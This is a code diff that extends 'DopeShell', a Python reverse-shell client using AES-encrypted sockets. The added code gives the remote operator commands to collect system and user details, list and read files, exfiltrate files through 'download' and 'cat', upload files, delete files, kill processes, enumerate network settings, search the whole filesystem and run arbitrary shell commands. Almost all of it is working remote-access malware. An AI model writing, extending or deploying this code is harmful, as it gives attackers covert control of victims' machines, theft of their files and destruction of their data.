@@ -3,7 +3,12 @@
 import socket
 import subprocess
 import os
+import getpass
+import platform
+import shutil
 import base64
+import struct
+import psutil
 import argparse
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
@@ -15,6 +20,13 @@ class DopeShellclient:
         self.server_port = server_port
         self.key = key
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    def send_data(self, data):
+        encrypted_data = self.encrypt(data)
+        # Send the length of the data first
+        self.sock.send(struct.pack('>I', len(encrypted_data)))
+        # Send the actual data
+        self.sock.sendall(encrypted_data)
 
     def encrypt(self, data):
         iv = os.urandom(16)
@@ -59,11 +71,158 @@ class DopeShellclient:
         self.sock.connect((self.server_ip, self.server_port))
         while True:
             command = self.decrypt(self.sock.recv(4096)).decode('utf-8')
+            
             if command.lower() == 'exit':
                 break
-            output = self.execute_command(command)
-            self.sock.send(self.encrypt(output))
+
+            elif command.lower() == 'info':
+                try:
+                    hostname = socket.gethostname()
+                    local_ip = socket.gethostbyname(hostname)
+                except:
+                    local_ip = "Unable to fetch IP"
+
+                client_info = (
+                    f"OS: {platform.system()} {platform.release()}\n"
+                    f"Architecture: {platform.machine()}\n"
+                    f"Hostname: {platform.node()}\n"
+                    f"Processor: {platform.processor()}\n"
+                    f"Current User: {getpass.getuser()}\n"
+                    f"Local IP Address: {local_ip}\n"
+                )
+                self.sock.send(self.encrypt(client_info.encode('utf-8')))
+
+            elif command.lower().startswith('ls'):
+                directory = command.split()[1] if len(command.split()) > 1 else '.'
+                try:
+                    files = "\n".join(os.listdir(directory))
+                except FileNotFoundError:
+                    files = f"[-] Directory '{directory}' not found."
+                self.sock.send(self.encrypt(files.encode('utf-8')))
+
+            elif command.lower() == 'pwd':
+                cwd = os.getcwd()
+                self.sock.send(self.encrypt(cwd.encode('utf-8')))
+
+            elif command.lower().startswith('cd'):
+                directory = command.split()[1] if len(command.split()) > 1 else '.'
+                try:
+                    os.chdir(directory)
+                    self.sock.send(self.encrypt(b"[+] Changed directory."))
+                except FileNotFoundError:
+                    self.sock.send(self.encrypt(f"[-] Directory '{directory}' not found.".encode('utf-8')))
+
+            elif command.lower().startswith('download'):
+                _, file_path = command.split()
+                try:
+                    with open(file_path, 'rb') as f:
+                        while chunk := f.read(4096):
+                            self.sock.send(self.encrypt(chunk))
+                    self.sock.send(self.encrypt(b'EOF'))
+                except FileNotFoundError:
+                    self.sock.send(self.encrypt(b"[-] File not found."))
+
+            elif command.lower().startswith('upload'):
+                _, file_name = command.split()
+                with open(file_name, 'wb') as f:
+                    while True:
+                        file_data = self.decrypt(self.sock.recv(4096))
+                        if file_data == b'EOF':
+                            break
+                        f.write(file_data)
+                self.sock.send(self.encrypt(b"[+] File upload complete."))
+
+            elif command.lower().startswith('mkdir'):
+                _, directory = command.split(' ', 1)
+                try:
+                    os.makedirs(directory)
+                    output = f"Directory '{directory}' created successfully."
+                except Exception as e:
+                    output = f"Failed to create directory '{directory}': {e}"
+                self.sock.send(self.encrypt(output.encode('utf-8')))
+
+            elif command.lower().startswith('delete'):
+                _, file_path = command.split(' ', 1)
+                try:
+                    os.remove(file_path)
+                    output = f"File '{file_path}' deleted successfully."
+                except Exception as e:
+                    output = f"Failed to delete file '{file_path}': {e}"
+                self.sock.send(self.encrypt(output.encode('utf-8')))
+
+            elif command.lower() == 'ps':
+                processes = ""
+                for proc in psutil.process_iter(['pid', 'name', 'username']):
+                    processes += f"PID: {proc.info['pid']}, Name: {proc.info['name']}, User: {proc.info['username']}\n"
+                self.send_data(processes.encode('utf-8'))
+
+            elif command.lower().startswith('kill'):
+                _, pid = command.split(' ', 1)
+                try:
+                    os.kill(int(pid), 9)
+                    output = f"Process {pid} killed successfully."
+                except Exception as e:
+                    output = f"Failed to kill process {pid}: {e}"
+                self.sock.send(self.encrypt(output.encode('utf-8')))
+
+            elif command.lower().startswith('cat'):
+                try:
+                    _, file_path = command.split(maxsplit=1)
+                    if os.path.exists(file_path) and os.path.isfile(file_path):
+                        with open(file_path, 'rb') as file:
+                            file_content = file.read()
+                        self.send_data(file_content)
+                    else:
+                        error_message = f"File {file_path} does not exist or is not a file."
+                        self.send_data(error_message.encode('utf-8'))
+                except Exception as e:
+                    error_message = f"Error reading file: {str(e)}"
+                    self.send_data(error_message.encode('utf-8'))
+
+            elif command.lower() == 'netstat':
+                netstat_output = subprocess.check_output('netstat -an', shell=True)
+                self.send_data(netstat_output)
+
+            elif command.lower() == 'clear':
+                # Clear screen command for the client shell (may not be fully visible in reverse shell setup)
+                output = "\033c"
+                self.sock.send(self.encrypt(output.encode('utf-8')))
+
+            elif command.lower() in ['ifconfig', 'ipconfig']:
+                if platform.system() == 'Windows':
+                    ifconfig_output = subprocess.check_output('ipconfig', shell=True)
+                else:
+                    ifconfig_output = subprocess.check_output('ifconfig', shell=True)
+                self.send_data(ifconfig_output)
+
+            elif command.lower().startswith('find'):
+                _, filename = command.split(' ', 1)
+                matches = ""
+                for root, dirs, files in os.walk('/'):
+                    if filename in files:
+                        matches += os.path.join(root, filename) + "\n"
+                if matches:
+                    self.send_data(matches)
+                else:
+                    output = f"No matches found for '{filename}'."
+                    self.sock.send(self.encrypt(output.encode('utf-8')))
+
+            elif command.lower() == 'sysinfo':
+                sys_info = (
+                    f"System: {platform.system()} {platform.release()}\n"
+                    f"Machine: {platform.machine()}\n"
+                    f"Processor: {platform.processor()}\n"
+                    f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
+                    f"Disk: {round(psutil.disk_usage('/').total / (1024**3), 2)} GB\n"
+                )
+                self.sock.send(self.encrypt(sys_info.encode('utf-8')))
+
+            else:
+                output = self.execute_command(command)
+                self.sock.send(self.encrypt(output))
+
         self.sock.close()
+
 
 def main():
     parser = argparse.ArgumentParser(description="DopeShell Reverse Shell Client")
